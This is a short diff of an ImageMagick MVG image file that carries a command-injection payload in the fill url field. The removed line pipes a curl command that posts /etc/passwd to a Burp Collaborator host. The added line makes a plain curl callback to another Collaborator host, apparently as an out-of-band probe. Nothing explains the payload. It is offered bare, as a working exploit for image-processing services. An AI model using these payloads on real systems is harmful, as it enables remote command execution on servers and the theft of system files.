@@ -1,4 +1,4 @@
 push graphic-context 
 viewbox 0 0 200 200 
-fill 'url(https://example.123 "|curl -d "@/etc/passwd" -X POST https://wyy8ndqy0v8plxijkp8svinn4ea5yu.burpcollaborator.net/test1")' 
+fill 'url(https://example.123 "|curl https://k1mwq1tm3jbdoll7ndbgy6qb72dv1k.burpcollaborator.net/test1")' 
 pop graphic-context
